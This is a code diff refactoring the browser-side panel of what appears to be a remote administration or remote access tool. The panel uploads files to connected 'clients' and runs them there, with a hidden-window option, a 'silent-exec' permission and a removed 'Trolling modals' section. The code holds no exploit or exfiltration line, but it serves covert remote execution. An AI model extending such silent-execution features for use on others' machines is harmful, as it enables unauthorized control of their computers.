+      } catch {
+        /* ignore */
+      }
+      stagingXhr = null;
+      hideStaging();
+      setUploadBusy(false);
+      showToast("Upload cancelled", "info");
+    }
+  });
+
+  function startJobPoll(jobId, { displayName, onTerminal } = {}) {
+    if (!jobId || controllers.has(jobId)) return;
+    let pollTimer = null;
+    let completed = false;
+    let cancelling = false;
+    let detached = false;
+
+    const cleanup = () => {
+      if (pollTimer) {
+        clearTimeout(pollTimer);
+        pollTimer = null;
+      }
+    };
+
+    const finish = () => {
+      cleanup();
+      completed = true;
+      controllers.delete(jobId);
+      onTerminal?.();
+      void refreshJobList({ quiet: true });
+    };
+
+    async function cancel() {
+      if (completed || cancelling || detached) return;
+      cancelling = true;
+      cleanup();
+      try {
+        await fetch(`/api/clients/${encodeURIComponent(clientId)}/remote-execute/${encodeURIComponent(jobId)}`, {
           method: "DELETE",
           credentials: "include",
         });
       } catch {
         /* best effort */
       }
+      jobsById.delete(jobId);
+      finish();
+      renderFileList();
+      showToast("Remote execute cancelled", "info");
     }
-    finishIdle(false);
-    showToast("Remote execute cancelled", "info");
-  }
 
-  panel.querySelectorAll("[data-rex-close]").forEach((btn) => {
-    btn.onclick = () => {
-      if (!completed) void cancelRemoteExecute();
-      else panel.remove();
-    };
-  });
+    function detach() {
+      if (completed || detached) return;
+      detached = true;
+      cleanup();
+      controllers.delete(jobId);
+      completed = true;
+    }
 
-  async function pollJob(jobId) {
-    if (completed) return;
-    try {
-      const res = await fetch(`/api/clients/${clientId}/remote-execute/${encodeURIComponent(jobId)}`, {
-        credentials: "include",
-      });
-      const status = await res.json().catch(() => ({}));
-      if (!res.ok) {
-        if (res.status === 404) {
-          clearRexReadyJob(clientId);
-          throw new Error("Job expired â€” upload again");
-        }
-        throw new Error(status.message || `Remote execute status failed: ${res.status}`);
-      }
-      if (completed) return;
+    async function poll() {
+      if (completed || detached || destroyed) return;
+      try {
+        const status = await fetchRexJob(clientId, jobId);
+        if (completed || detached || destroyed) return;
+        jobsById.set(jobId, status);
+        renderFileList();
 
-      const pct =
-        status.status === "succeeded" || status.status === "ready"
-          ? 100
-          : Math.min(99, Math.max(0, Number(status.percent) || 0));
-      const displayName = options.displayName || options.file?.name || status.originalName || "file";
-      showRexPanelProgress(panel, {
-        label: `${remoteExecutePhaseLabel(status.phase, status)}â€¦ ${pct}%`,
-        percent: pct,
-        metaHtml: renderRemoteExecuteDetails(status, { name: displayName, size: status.totalBytes || options.file?.size }),
-        actionsHtml: `<button type="button" class="sp-progress-action sp-progress-action-muted" data-rex-cancel>Cancel</button>`,
-      });
-      panel.querySelector("[data-rex-cancel]")?.addEventListener("click", () => void cancelRemoteExecute());
-
-      if (status.status === "ready") {
-        completed = true;
-        cleanupTimers();
-        saveRexReadyJob(clientId, status);
-        onDone();
-        showRexPanelProgress(panel, {
-          label: "Uploaded â€” ready to execute",
-          percent: 100,
-          metaHtml: renderRemoteExecuteDetails(status, { name: displayName, size: status.totalBytes }),
-          actionsHtml: `
-            <button type="button" class="sp-progress-action" data-rex-exec>Execute now</button>
-            <button type="button" class="sp-progress-action sp-progress-action-muted" data-rex-dismiss>Close</button>
-          `,
-        });
-        panel.querySelector("[data-rex-exec]")?.addEventListener("click", () => {
-          const args = Array.isArray(status.args)
-            ? status.args.map((a) => (/\s/.test(String(a)) ? `"${a}"` : String(a))).join(" ")
-            : options.args;
-          runRemoteExecuteInPanel(panel, clientId, {
-            kind: "execute",
-            jobId: status.jobId,
-            displayName,
-            hideWindow: !!status.hideWindow || !!options.hideWindow,
-            args,
-            onDone,
-          });
-        });
-        panel.querySelector("[data-rex-dismiss]")?.addEventListener("click", () => panel.remove());
-        panel.querySelectorAll("[data-rex-close]").forEach((btn) => {
-          btn.onclick = () => panel.remove();
-        });
-        return;
-      }
-
-      if (status.status === "succeeded") {
-        completed = true;
-        clearRexReadyJob(clientId);
-        cleanupTimers();
-        onDone();
-        showRexPanelProgress(panel, {
-          label: "Execution completed 100%",
-          percent: 100,
-          metaHtml: renderRemoteExecuteDetails(status, { name: displayName, size: status.totalBytes }),
-          actionsHtml: `<button type="button" class="sp-progress-action" data-rex-dismiss>Close</button>`,
-        });
-        panel.querySelector("[data-rex-dismiss]")?.addEventListener("click", () => panel.remove());
-        panel.querySelectorAll("[data-rex-close]").forEach((btn) => {
-          btn.onclick = () => panel.remove();
-        });
-        showToast(`Executed successfully: ${displayName}`, "success", 6000);
-        return;
-      }
-
-      if (status.status === "failed") {
-        completed = true;
-        cleanupTimers();
-        onDone();
-        if (status?.error?.code === "cancelled") {
-          panel.remove();
-          showToast("Remote execute cancelled", "info");
+        if (status.status === "ready" || status.status === "succeeded" || status.status === "failed") {
+          if (status.status === "succeeded") {
+            showToast(`Executed successfully: ${displayName || status.originalName || "file"}`, "success", 5000);
+          }
+          if (status.status === "failed" && status?.error?.code === "cancelled") {
+            jobsById.delete(jobId);
+          }
+          finish();
           return;
         }
-        showRexPanelProgress(panel, {
-          label: "Failed",
-          percent: Math.min(99, Number(status.percent) || 0),
-          metaHtml: `<pre class="sp-rex-error">${escapeHtml(remoteExecuteErrorText(status))}</pre>`,
-          actionsHtml: `<button type="button" class="sp-progress-action" data-rex-dismiss>Close</button>`,
-        });
-        panel.querySelector("[data-rex-dismiss]")?.addEventListener("click", () => panel.remove());
-        panel.querySelectorAll("[data-rex-close]").forEach((btn) => {
-          btn.onclick = () => panel.remove();
-        });
-        return;
-      }
 
-      const interval =
-        status.phase === "client_transfer" ? REMOTE_EXECUTE_TRANSFER_POLL_MS : REMOTE_EXECUTE_POLL_MS;
-      pollTimer = setTimeout(() => pollJob(jobId), interval);
-    } catch (err) {
-      if (completed) return;
-      completed = true;
-      cleanupTimers();
-      onDone();
-      showRexPanelProgress(panel, {
-        label: "Failed",
-        percent: 0,
-        metaHtml: `<pre class="sp-rex-error">${escapeHtml(err.message || "Remote execute failed")}</pre>`,
-        actionsHtml: `<button type="button" class="sp-progress-action" data-rex-dismiss>Close</button>`,
-      });
-      panel.querySelector("[data-rex-dismiss]")?.addEventListener("click", () => panel.remove());
+        const interval =
+          status.phase === "client_transfer" ? REMOTE_EXECUTE_TRANSFER_POLL_MS : REMOTE_EXECUTE_POLL_MS;
+        pollTimer = setTimeout(() => void poll(), interval);
+      } catch (err) {
+        if (completed || detached) return;
+        if (err.status === 404) jobsById.delete(jobId);
+        finish();
+        renderFileList();
+        if (err.status !== 404) {
+          showToast(err.message || "Remote execute failed", "error");
+        }
+      }
     }
+
+    controllers.set(jobId, { cancel, detach });
+    void poll();
   }
 
-  if (options.kind === "execute") {
-    showRexPanelProgress(panel, {
-      label: "Starting executionâ€¦",
-      percent: 15,
-      metaHtml: `<div class="sp-progress-detail">${escapeHtml(options.displayName || "payload")}</div>`,
-      actionsHtml: `<button type="button" class="sp-progress-action sp-progress-action-muted" data-rex-cancel>Cancel</button>`,
+  function startExecute(jobId, displayName) {
+    if (!jobId || controllers.has(jobId)) return;
+    const opts = readFormOptions();
+    const optimistic = {
+      ...(jobsById.get(jobId) || { jobId, originalName: displayName }),
+      status: "running",
+      phase: "execute",
+      percent: 10,
+      updatedAt: Date.now(),
+    };
+    jobsById.set(jobId, optimistic);
+    renderFileList();
+
+    // Placeholder controller until poll starts
+    let cancelledBeforeStart = false;
+    controllers.set(jobId, {
+      cancel: async () => {
+        cancelledBeforeStart = true;
+        controllers.delete(jobId);
+        try {
+          await fetch(`/api/clients/${encodeURIComponent(clientId)}/remote-execute/${encodeURIComponent(jobId)}`, {
+            method: "DELETE",
+            credentials: "include",
+          });
+        } catch {
+          /* ignore */
+        }
+        void refreshJobList({ quiet: true });
+      },
+      detach: () => {
+        controllers.delete(jobId);
+      },
     });
-    panel.querySelector("[data-rex-cancel]")?.addEventListener("click", () => void cancelRemoteExecute());
 
     const body = {};
-    if (options.args) body.args = options.args;
-    if (typeof options.hideWindow === "boolean") body.hideWindow = options.hideWindow;
+    if (opts.args) body.args = opts.args;
+    if (typeof opts.hideWindow === "boolean") body.hideWindow = opts.hideWindow;
 
-    fetch(`/api/clients/${clientId}/remote-execute/${encodeURIComponent(options.jobId)}/execute`, {
+    fetch(`/api/clients/${encodeURIComponent(clientId)}/remote-execute/${encodeURIComponent(jobId)}/execute`, {
       method: "POST",
       credentials: "include",
       headers: { "Content-Type": "application/json" },
@@ -1019,143 +1156,160 @@ function runRemoteExecuteInPanel(panel, clientId, options = {}) {
     })
       .then(async (res) => {
         const data = await res.json().catch(() => ({}));
+        if (cancelledBeforeStart || destroyed) return;
+        controllers.delete(jobId);
         if (!res.ok) {
-          if (res.status === 404) clearRexReadyJob(clientId);
-          throw new Error(data.message || `Execute failed: ${res.status}`);
+          if (res.status === 404) {
+            jobsById.delete(jobId);
+            renderFileList();
+            showToast(data.message || "Job expired - upload again", "error");
+            return;
+          }
+          if (res.status === 409) {
+            // Attach to whatever state the job is in
+            startJobPoll(jobId, { displayName });
+            void refreshJobList({ quiet: true });
+            return;
+          }
+          showToast(data.message || `Execute failed: ${res.status}`, "error");
+          void refreshJobList({ quiet: true });
+          return;
         }
-        activeJobId = options.jobId;
-        pollJob(options.jobId);
+        if (data?.jobId) jobsById.set(jobId, data);
+        startJobPoll(jobId, { displayName });
       })
       .catch((err) => {
-        if (completed) return;
-        completed = true;
-        onDone();
-        showRexPanelProgress(panel, {
-          label: "Failed",
-          percent: 0,
-          metaHtml: `<pre class="sp-rex-error">${escapeHtml(err.message || "Failed to start execution")}</pre>`,
-          actionsHtml: `<button type="button" class="sp-progress-action" data-rex-dismiss>Close</button>`,
-        });
-        panel.querySelector("[data-rex-dismiss]")?.addEventListener("click", () => panel.remove());
+        if (cancelledBeforeStart || destroyed) return;
+        controllers.delete(jobId);
+        showToast(err.message || "Failed to start execution", "error");
+        void refreshJobList({ quiet: true });
       });
-
-    return { cancel: cancelRemoteExecute };
   }
 
-  // Upload path
-  const file = options.file;
-  const mode = options.mode === "upload_only" ? "upload_only" : "upload_and_run";
-  const formData = new FormData();
-  formData.append("file", file);
-  formData.append("mode", mode);
-  if (options.args) formData.append("args", options.args);
-  if (options.hideWindow) formData.append("hideWindow", "true");
+  function startUpload(mode) {
+    if (uploadBusy) return;
+    const file = fileInput?.files?.[0];
+    if (!file) {
+      showToast("Select a file to upload", "error");
+      return;
+    }
+    if (file.size <= 0) {
+      showToast("File is empty", "error");
+      return;
+    }
+    if (file.size > REMOTE_EXECUTE_MAX_SIZE) {
+      showToast(
+        `File too large (${(file.size / 1024 / 1024).toFixed(1)} MB). Max is ${REMOTE_EXECUTE_MAX_SIZE / 1024 / 1024} MB.`,
+        "error",
+      );
+      return;
+    }
 
-  showRexPanelProgress(panel, {
-    label: "Preparing remote executeâ€¦",
-    percent: 0,
-    metaHtml: `<div class="sp-progress-detail">${escapeHtml(file.name)}</div>`,
-    actionsHtml: `<button type="button" class="sp-progress-action sp-progress-action-muted" data-rex-cancel>Cancel</button>`,
-  });
-  panel.querySelector("[data-rex-cancel]")?.addEventListener("click", () => void cancelRemoteExecute());
+    const opts = readFormOptions();
+    const formData = new FormData();
+    formData.append("file", file);
+    formData.append("mode", mode === "upload_only" ? "upload_only" : "upload_and_run");
+    if (opts.args) formData.append("args", opts.args);
+    if (opts.hideWindow) formData.append("hideWindow", "true");
 
-  xhr.upload.addEventListener("progress", (e) => {
-    if (!e.lengthComputable || completed) return;
-    const pct = Math.min(99, Math.floor((e.loaded / e.total) * 100));
-    showRexPanelProgress(panel, {
-      label: `Host to serverâ€¦ ${pct}%`,
-      percent: Math.min(10, Math.floor(pct * 0.1)),
-      metaHtml: `
-        <div class="sp-progress-detail">${escapeHtml(file.name)} Â· ${formatBytes(e.loaded)} / ${formatBytes(e.total)}</div>
-        <div class="sp-progress-detail">Staging before client transfer</div>
-      `,
-      actionsHtml: `<button type="button" class="sp-progress-action sp-progress-action-muted" data-rex-cancel>Cancel</button>`,
+    const xhr = new XMLHttpRequest();
+    stagingXhr = xhr;
+    setUploadBusy(true);
+    showStaging(
+      "Staging on server... 0%",
+      `<div class="sp-progress-detail rex-tone-run">${escapeHtml(file.name)}</div>`,
+    );
+
+    xhr.upload.addEventListener("progress", (e) => {
+      if (!e.lengthComputable || stagingXhr !== xhr) return;
+      const pct = Math.min(99, Math.floor((e.loaded / e.total) * 100));
+      showStaging(
+        `Staging on server... ${pct}%`,
+        `<div class="sp-progress-detail rex-tone-run">${escapeHtml(file.name)} · ${formatBytes(e.loaded)} / ${formatBytes(e.total)}</div>`,
+      );
     });
-    panel.querySelector("[data-rex-cancel]")?.addEventListener("click", () => void cancelRemoteExecute());
+
+    xhr.addEventListener("load", () => {
+      if (stagingXhr !== xhr) return;
+      stagingXhr = null;
+      setUploadBusy(false);
+      hideStaging();
+      if (xhr.status >= 200 && xhr.status < 300) {
+        try {
+          const res = JSON.parse(xhr.responseText);
+          if (res.ok && res.jobId) {
+            jobsById.set(res.jobId, res);
+            renderFileList();
+            startJobPoll(res.jobId, { displayName: file.name });
+            void refreshJobList({ quiet: true });
+            return;
+          }
+          showToast(res.message || "Remote execute failed", "error");
+        } catch {
+          showToast("Remote execute response was not valid JSON", "error");
+        }
+      } else {
+        let msg = "Upload failed";
+        try {
+          msg = JSON.parse(xhr.responseText).message || msg;
+        } catch {
+          /* ignore */
+        }
+        if (xhr.status === 403) msg = "Permission denied (requires silent-exec)";
+        showToast(msg, "error");
+      }
+    });
+
+    xhr.addEventListener("error", () => {
+      if (stagingXhr !== xhr) return;
+      stagingXhr = null;
+      setUploadBusy(false);
+      hideStaging();
+      showToast("Network error during upload", "error");
+    });
+
+    xhr.addEventListener("abort", () => {
+      if (stagingXhr === xhr) stagingXhr = null;
+      setUploadBusy(false);
+      hideStaging();
+    });
+
+    xhr.open("POST", `/api/clients/${encodeURIComponent(clientId)}/remote-execute`);
+    xhr.withCredentials = true;
+    xhr.send(formData);
+  }
+
+  panel.querySelectorAll("[data-rex-action]").forEach((btn) => {
+    btn.addEventListener("click", () => {
+      if (btn.disabled || uploadBusy) return;
+      const action = btn.getAttribute("data-rex-action");
+      if (action === "upload_only" || action === "upload_and_run") startUpload(action);
+    });
   });
 
-  xhr.addEventListener("load", () => {
-    if (completed) return;
-    stagingDone = true;
-    if (xhr.status >= 200 && xhr.status < 300) {
-      try {
-        const res = JSON.parse(xhr.responseText);
-        if (res.ok && res.jobId) {
-          activeJobId = res.jobId;
-          const stagedPct = Math.max(10, Math.min(15, Number(res.percent) || 10));
-          const ver = res.clientVersion ? ` Â· agent v${res.clientVersion}` : "";
-          showRexPanelProgress(panel, {
-            label: `Waiting for clientâ€¦ ${stagedPct}%`,
-            percent: stagedPct,
-            metaHtml: `
-              <div class="sp-progress-detail">${escapeHtml(file.name)} Â· staged ${formatBytes(res.totalBytes || file.size)} Â· waiting for client pullâ€¦</div>
-              <div class="sp-progress-detail">To: ${escapeHtml(res.destinationPath || "unknown destination")}${escapeHtml(ver)}</div>
-              <div class="sp-progress-detail">Mode: ${escapeHtml(mode === "upload_only" ? "upload only" : "upload & run")}</div>
-            `,
-            actionsHtml: `<button type="button" class="sp-progress-action sp-progress-action-muted" data-rex-cancel>Cancel</button>`,
-          });
-          panel.querySelector("[data-rex-cancel]")?.addEventListener("click", () => void cancelRemoteExecute());
-          pollJob(res.jobId);
-        } else {
-          completed = true;
-          onDone();
-          showRexPanelProgress(panel, {
-            label: "Failed",
-            percent: 0,
-            metaHtml: `<pre class="sp-rex-error">${escapeHtml(res.message || "Remote execute failed")}</pre>`,
-            actionsHtml: `<button type="button" class="sp-progress-action" data-rex-dismiss>Close</button>`,
-          });
-          panel.querySelector("[data-rex-dismiss]")?.addEventListener("click", () => panel.remove());
-        }
-      } catch {
-        completed = true;
-        onDone();
-        showToast("Remote execute response was not valid JSON", "error", 6000);
-        panel.remove();
+  host.appendChild(panel);
+  requestAnimationFrame(() => {
+    applyRexPanelPosition(panel, host, clientId, loadRexPanelPos(clientId));
+    enableRexPanelDrag(panel, host, clientId);
+  });
+
+  void refreshJobList().then(() => {
+    // Auto-attach pollers for any running jobs already on server
+    for (const job of jobsById.values()) {
+      if ((job.status === "running" || job.status === "queued") && !controllers.has(job.jobId)) {
+        startJobPoll(job.jobId, { displayName: job.originalName });
       }
-    } else {
-      let msg = "Upload failed";
-      try {
-        msg = JSON.parse(xhr.responseText).message || msg;
-      } catch {
-        /* ignore */
-      }
-      if (xhr.status === 403) msg = "Permission denied (requires silent-exec)";
-      completed = true;
-      onDone();
-      showRexPanelProgress(panel, {
-        label: "Failed",
-        percent: 0,
-        metaHtml: `<pre class="sp-rex-error">${escapeHtml(msg)}</pre>`,
-        actionsHtml: `<button type="button" class="sp-progress-action" data-rex-dismiss>Close</button>`,
-      });
-      panel.querySelector("[data-rex-dismiss]")?.addEventListener("click", () => panel.remove());
     }
   });
 
-  xhr.addEventListener("error", () => {
-    if (completed) return;
-    completed = true;
-    onDone();
-    showToast("Network error during upload", "error");
-    panel.remove();
-  });
-
-  xhr.addEventListener("abort", () => {
-    if (completed) return;
-    completed = true;
-    onDone();
-  });
-
-  xhr.open("POST", `/api/clients/${clientId}/remote-execute`);
-  xhr.withCredentials = true;
-  xhr.send(formData);
-
-  return { cancel: cancelRemoteExecute };
+  return panel;
 }
 
-/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
-/*  Trolling modals                                            */
+function openRemoteExecuteModal(clientId) {
+  createRemoteExecutePanel(clientId);
+}
+
+
 /* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
 
 function closeSpModal(overlay) {
